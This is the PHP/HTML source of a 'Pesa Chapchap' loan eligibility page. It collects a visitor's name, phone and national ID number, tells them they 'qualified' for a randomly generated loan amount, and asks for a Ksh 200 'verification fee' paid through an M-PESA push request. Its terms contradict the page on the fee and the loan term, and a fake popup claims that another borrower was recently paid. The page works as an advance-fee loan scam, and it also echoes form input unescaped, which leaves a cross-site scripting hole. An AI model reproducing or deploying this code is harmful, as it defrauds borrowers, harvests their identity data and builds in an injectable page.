<?php
// Retrieve the form data
$name = $_POST['name'];
$phone_number = $_POST['phone_number'];
$id_number = $_POST['id_number'];
$loan_type = $_POST['loan_type'];

//create a variable called processed phone_number which removes the first 0 and replaces it with 254
$processed_phone_number = substr($phone_number, 1);
$processed_phone_number = "254" . $processed_phone_number;

//fee charged for verification of loan
$fee = 200;


//create a variable called amount which has a random value of 7600, 8300, 45000, 5000

$amount = rand(7600, 8300);




?>



<!DOCTYPE html><html lang="en"><head>
<title>    Loan Eligibility Check
 | Pesa Chapchap</title>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" type="image/png" href="favicon.ico">
<meta name="robots" content="index, follow">
<meta name="referrer" content="origin-when-cross-origin">
<meta content="True" name="HandheldFriendly">



<meta property="og:image" content="index_1.html">
<link href="css/css2.css" rel="stylesheet">
<link href="css/css2_1.css" rel="stylesheet">
<link href="css/css2_2.css" rel="stylesheet">

<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">

<link rel="stylesheet" type="text/css" href="css/all.css">

<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" type="text/css" href="css/responsive.css">
<link rel="stylesheet" type="text/css" href="css/animation.css">
<style>[wire\:loading], [wire\:loading\.delay], [wire\:loading\.inline-block], [wire\:loading\.inline], [wire\:loading\.block], [wire\:loading\.flex], [wire\:loading\.table], [wire\:loading\.grid], [wire\:loading\.inline-flex] {display: none;}[wire\:loading\.delay\.shortest], [wire\:loading\.delay\.shorter], [wire\:loading\.delay\.short], [wire\:loading\.delay\.long], [wire\:loading\.delay\.longer], [wire\:loading\.delay\.longest] {display:none;}[wire\:offline] {display: none;}[wire\:dirty]:not(textarea):not(input):not(select) {display: none;}input:-webkit-autofill, select:-webkit-autofill, textarea:-webkit-autofill {animation-duration: 50000s;animation-name: livewireautofill;}@keyframes livewireautofill { from {} }</style>
<script type="text/javascript" class="flasher-js">(function() {    var rootScript = 'https://cdn.jsdelivr.net/npm/@flasher/flasher@1.2.3/dist/flasher.min.js';    var FLASHER_FLASH_BAG_PLACE_HOLDER = {};    var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER);    function mergeOptions(first, second) {        return {            context: merge(first.context || {}, second.context || {}),            envelopes: merge(first.envelopes || [], second.envelopes || []),            options: merge(first.options || {}, second.options || {}),            scripts: merge(first.scripts || [], second.scripts || []),            styles: merge(first.styles || [], second.styles || []),        };    }    function merge(first, second) {        if (Array.isArray(first) && Array.isArray(second)) {            return first.concat(second).filter(function(item, index, array) {                return array.indexOf(item) === index;            });        }        return Object.assign({}, first, second);    }    function renderOptions(options) {        if(!window.hasOwnProperty('flasher')) {            console.error('Flasher is not loaded');            return;        }        requestAnimationFrame(function () {            window.flasher.render(options);        });    }    function render(options) {        if ('loading' !== document.readyState) {            renderOptions(options);            return;        }        document.addEventListener('DOMContentLoaded', function() {            renderOptions(options);        });    }    if (1 === document.querySelectorAll('script.flasher-js').length) {        document.addEventListener('flasher:render', function (event) {            render(event.detail);        });    }    if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) {        render(options);    } else {        var tag = document.createElement('script');        tag.setAttribute('src', rootScript);        tag.setAttribute('type', 'text/javascript');        tag.onload = function () {            render(options);        };        document.head.appendChild(tag);    }})();</script><script src="js/flasher.min.js" type="text/javascript"></script>
<style type="text/css">.fl-main-container{position:fixed;transition:all 1s ease-in-out;width:24rem;z-index:99999}@media only screen and (max-width:480px){.fl-main-container{left:.5rem;right:.5rem;width:auto}}.fl-main-container[data-position^=top-]{top:.5rem}.fl-main-container[data-position^=bottom-]{bottom:.5rem}.fl-main-container[data-position$=-right]{right:.5rem}.fl-main-container[data-position$=-right] .fl-container{transform:translateX(110%)}.fl-main-container[data-position$=-left]{left:.5rem}.fl-main-container[data-position$=-left] .fl-container{transform:translateX(-110%)}.fl-main-container[data-position$=-center]{left:50%;transform:translateX(-50%)}.fl-main-container[data-position=top-center] .fl-container{transform:translateY(-100vh)}.fl-main-container[data-position=bottom-center] .fl-container{transform:translateY(100vh)}.fl-main-container .fl-container{transition:transform .3s ease-in-out}.fl-main-container .fl-container.fl-show{transform:translate(0)}.fl-main-container .fl-container .fl-progress-bar{display:flex;height:.125rem;margin-left:-1px}.fl-main-container .fl-container.fl-rtl{direction:rtl}.fl-main-container .fl-container.fl-rtl .fl-progress-bar{margin-left:auto;margin-right:-1px}.fl-main-container .fl-container.fl-success .fl-icon{background-color:#059669}.fl-main-container .fl-container.fl-success .fl-progress-bar{background-color:#6dface}.fl-main-container .fl-container.fl-success .fl-progress-bar .fl-progress{background-color:#059669}.fl-main-container .fl-container.fl-flasher.fl-success{border-left:.8rem solid #059669}.fl-main-container .fl-container.fl-flasher.fl-success.fl-rtl{border-left:none;border-right:.8rem solid #059669}.fl-main-container .fl-container.fl-flasher.fl-success:not(.fl-rtl){border-left:.8rem solid #059669;border-right:none}.fl-main-container .fl-container.fl-flasher.fl-success .fl-title{color:#059669}.fl-main-container .fl-container.fl-info .fl-icon{background-color:#2563eb}.fl-main-container .fl-container.fl-info .fl-progress-bar{background-color:#e0e9fc}.fl-main-container .fl-container.fl-info .fl-progress-bar .fl-progress{background-color:#2563eb}.fl-main-container .fl-container.fl-flasher.fl-info{border-left:.8rem solid #2563eb}.fl-main-container .fl-container.fl-flasher.fl-info.fl-rtl{border-left:none;border-right:.8rem solid #2563eb}.fl-main-container .fl-container.fl-flasher.fl-info:not(.fl-rtl){border-left:.8rem solid #2563eb;border-right:none}.fl-main-container .fl-container.fl-flasher.fl-info .fl-title{color:#2563eb}.fl-main-container .fl-container.fl-warning .fl-icon{background-color:#d97706}.fl-main-container .fl-container.fl-warning .fl-progress-bar{background-color:#fdd8ae}.fl-main-container .fl-container.fl-warning .fl-progress-bar .fl-progress{background-color:#d97706}.fl-main-container .fl-container.fl-flasher.fl-warning{border-left:.8rem solid #d97706}.fl-main-container .fl-container.fl-flasher.fl-warning.fl-rtl{border-left:none;border-right:.8rem solid #d97706}.fl-main-container .fl-container.fl-flasher.fl-warning:not(.fl-rtl){border-left:.8rem solid #d97706;border-right:none}.fl-main-container .fl-container.fl-flasher.fl-warning .fl-title{color:#d97706}.fl-main-container .fl-container.fl-error .fl-icon{background-color:#dc2626}.fl-main-container .fl-container.fl-error .fl-progress-bar{background-color:#f8d6d6}.fl-main-container .fl-container.fl-error .fl-progress-bar .fl-progress{background-color:#dc2626}.fl-main-container .fl-container.fl-flasher.fl-error{border-left:.8rem solid #dc2626}.fl-main-container .fl-container.fl-flasher.fl-error.fl-rtl{border-left:none;border-right:.8rem solid #dc2626}.fl-main-container .fl-container.fl-flasher.fl-error:not(.fl-rtl){border-left:.8rem solid #dc2626;border-right:none}.fl-main-container .fl-container.fl-flasher.fl-error .fl-title{color:#dc2626}.fl-main-container .fl-container .fl-icon{border-radius:50%;box-sizing:border-box;color:#fff;display:inline-block;height:1em;margin:0;position:relative;transition:all 1s;width:1em}.fl-main-container .fl-container .fl-icon:after,.fl-main-container .fl-container .fl-icon:before{border-width:0;box-sizing:border-box;content:"";position:absolute;transition:all 1s}.fl-main-container .fl-container.fl-success .fl-icon:after,.fl-main-container .fl-container.fl-success .fl-icon:before{background-color:currentColor;border-radius:.1em;height:.6em;left:.35em;top:.6em;transform:rotate(-135deg);transform-origin:.08em .08em;width:.16em}.fl-main-container .fl-container.fl-success .fl-icon:after{height:.16em;width:.4em}.fl-main-container .fl-container.fl-info .fl-icon:after,.fl-main-container .fl-container.fl-info .fl-icon:before{background-color:currentColor;border-radius:.03em;left:50%;transform:translateX(-50%);width:.15em}.fl-main-container .fl-container.fl-info .fl-icon:before{height:.38em;top:.4em}.fl-main-container .fl-container.fl-info .fl-icon:after{box-shadow:-.06em .19em,-.06em .44em,.06em .44em;height:.13em;top:.21em}.fl-main-container .fl-container.fl-warning .fl-icon:after,.fl-main-container .fl-container.fl-warning .fl-icon:before{background-color:currentColor;border-radius:.03em;left:50%;transform:translateX(-50%);width:.15em}.fl-main-container .fl-container.fl-warning .fl-icon:before{height:.38em;top:.21em}.fl-main-container .fl-container.fl-warning .fl-icon:after{height:.13em;top:.65em}.fl-main-container .fl-container.fl-error .fl-icon:after,.fl-main-container .fl-container.fl-error .fl-icon:before{background-color:currentColor;border-radius:.1em;height:.7em;left:50%;top:50%;transform:translate(-50%,-50%) rotate(-135deg);width:.16em}.fl-main-container .fl-container.fl-error .fl-icon:after{transform:translate(-50%,-50%) rotate(-45deg)}.fl-main-container .fl-container.fl-flasher{background-color:#fff;box-shadow:0 10px 15px -3px rgba(0,0,0,.1),0 4px 6px -2px rgba(0,0,0,.05);color:#4b5563;cursor:pointer;line-height:1.5;margin-top:.5rem;word-break:break-word}.fl-main-container .fl-container.fl-flasher.fl-rtl{border-radius:0 .375rem .375rem 0}.fl-main-container .fl-container.fl-flasher:not(.fl-rtl){border-radius:.375rem 0 0 .375rem}.fl-main-container .fl-container.fl-flasher .fl-content{align-items:center;display:flex;padding:.75rem}.fl-main-container .fl-container.fl-flasher .fl-icon{font-size:2.5rem}.fl-main-container .fl-container.fl-flasher .fl-message,.fl-main-container .fl-container.fl-flasher .fl-title{display:block;line-height:1.25rem;margin-left:1rem;margin-right:1rem}.fl-main-container .fl-container.fl-flasher .fl-message:first-letter,.fl-main-container .fl-container.fl-flasher .fl-title:first-letter{text-transform:uppercase}.fl-main-container .fl-container.fl-flasher .fl-title{font-size:1rem;font-weight:700}.fl-main-container .fl-container.fl-flasher .fl-message{font-size:.875rem;margin-top:.25rem}</style>
</head>
<body class="loaded">

<div class="boxed_wrapper">
<div class="loader-wrapper">
<div class="loader">
</div>
<div class="loader-section section-left"></div>
<div class="loader-section section-right"></div>
</div>

<section style="background: #f1faee">
<div class="container">
<div class="wrapper">
<div class="row pb-3">
<div class="col-md-3"></div>
<div class="col-md-6">
<div class="card">
<div class="card-body">
<h6>Hi <strong> <?php echo $name ?></strong>, you have qualified for a Loan of <strong>Ksh. <?php echo $amount; ?></strong> to your M-PESA. Your loan repayment period is
2 months with a <strong>6% interest rate</strong>. Terms and conditions apply</h6>
</div>
</div>
</div>
<div class="col-md-3"></div>
</div>
<div class="row pb-2">
<div class="col-md-3"></div>
<div class="col-md-6">
<div class="mt-2 alert alert-success d-none" role="alert">
Please enter your M-PESA PIN in the prompt on your phone to complete the process.
</div>
<div class="card">

<div class="card-body">
<table class="table table-responsive table-bordered table-striped">
<tbody><tr>
<td>Loan Tracking ID:</td>
<td>LON-C1176L1943</td>
</tr>





<tr>
<td>Your Names:</td>
<td>
    <?php echo $name; ?>

</td>
</tr>
<tr>
<td>MPESA Number:</td>
<td>
    <?php echo $processed_phone_number; ?>
</td>
</tr>
<tr>
<td>ID Number:</td>
<td>
    <?php echo $id_number; ?>
</td>
</tr>
<tr>
<td>Loan Type</td>
<td>
    <?php echo $loan_type; ?>
</td>
</tr>
<tr>
<td>Qualified Loan</td>
<td>Ksh. 
    <?php echo $amount; ?>
</td>
</tr>
<tr>
<td>Verification Fee</td>
<td>Ksh. 
    <?php echo $fee; ?>
</td>
</tr>
</tbody></table>
<form method="POST" action="mpesa/stkpush.php">
  <input type="hidden" name="_token" value="55cZURnpYjvc1qwIbv7DqxNkFYZx0cknXIJPZkkf">
  <input type="hidden" name="phone" value="<?php echo $processed_phone_number; ?>">
  <input type="hidden" name="loan-fee" value="<?php echo $fee; ?>">

  <div class="row pb-2">
    <div class="signin-none tab-100 col-md-12">
      <label class="signin-none">
        <span>
          By submitting, you confirm that you accept the <a data-bs-toggle="modal" data-bs-target="#terms" style="color:#564FF9;">Terms and Conditions</a> and <a data-bs-toggle="modal" data-bs-target="#policy" style="color:#564FF9;">Privacy Policy</a>
        </span>
      </label>
    </div>
  </div>

  <button type="submit" class="btn btn-danger">Get Loan Now</button>
</form>

</div>
</div>
</div>
<div class="col-md-3"></div>
</div>
<div class="row">
<div class="col-12">
<p class="text-center text-muted">© 2023. All rights reserved. Go back <a href="/" style="color:#564FF9;">home</a>.</p>
</div>
</div>
</div>
</div>
</section>
<div class="modal fade" id="policy" tabindex="-1" aria-labelledby="policy" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="policy">Loan Policies</h5>
<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
</div>
<div class="modal-body">
We care about your privacy, data protection, and confidentiality. This Privacy policy <strong>(hereinafter – “Privacy policy”)</strong> states, what information we collect, for which purposes and means, and what are your rights.
<p> When is this Privacy policy applicable?</p>
<p>This Privacy policy applies when:</p>
<p>
You use or have expressed the intention to use any of our Services;
You represent a Client (for example as a guarantor, the payer, authorized representative, next of kin etc.) or you have been indicated as the contact person for the Client;</p>
<p>
You have used our Services in the past and we are required to retain this information;</p>
<p>
You contact us or visit any of our representative and customer service offices;
You visit our website;</p>
<p>
In any other way provide us with your personal data for any of the data processing purposes set in this Privacy policy.
</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="terms" tabindex="-1" aria-labelledby="terms" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title" id="terms">Terms and Conditions</h5>
<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
</div>
<div class="modal-body">
<p>Loan facilities borrowed under this product will be hinged on pre- existing
products features.
</p>
<p>
In case of default of the USSD loans; the loan product facility shall be deemed to be in arrears and normal collection Processes shall apply.
</p>
<p>
The maximum loan amount: Ksh 15,000 fee of Ksh. 95 <strong> Non-refundable fee</strong> is paid by borrower for detail verification
</p>
<p>
Maximum Loan duration: Loan should be repayable in 1 Month (30 Days) from the day of borrowing
</p>
<p>
Loan disbursement: Loan will be disbursed to the MPESA number provided &amp; takes 5-7 working days to be processed.
</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

</div>
<div id="social-proof" style="bottom: 10px;">
<div id="title"><span class="name">Kip</span> <span class="object">0722xxx9404</span> </div>
<div id="description"><span class="action">Received Ksh. <span class="address">20,000</span> </span> <span class="course">Educational Loan</span></div>
<div id="time"><span class="time-counter">57</span>s Ago</div>
</div>

<script src="js/livewire.js" data-turbo-eval="false" data-turbolinks-eval="false"></script><script data-turbo-eval="false" data-turbolinks-eval="false">window.livewire = new Livewire();window.Livewire = window.livewire;window.livewire_app_url = '';window.livewire_token = '55cZURnpYjvc1qwIbv7DqxNkFYZx0cknXIJPZkkf';window.deferLoadingAlpine = function (callback) {window.addEventListener('livewire:load', function () {callback();});};let started = false;window.addEventListener('alpine:initializing', function () {if (! started) {window.livewire.start();started = true;}});document.addEventListener("DOMContentLoaded", function () {if (! started) {window.livewire.start();started = true;}});</script>

<script src="js/bootstrap.min.js"></script>

<script src="js/jquery-3.6.0.min.js"></script>
<script src="js/jquery.easing.min.js"></script>

<script src="js/script.js"></script>

<script>
    window.addEventListener('load',function(){
        document.querySelector('body').classList.add("loaded")
    });
</script>


</body></html>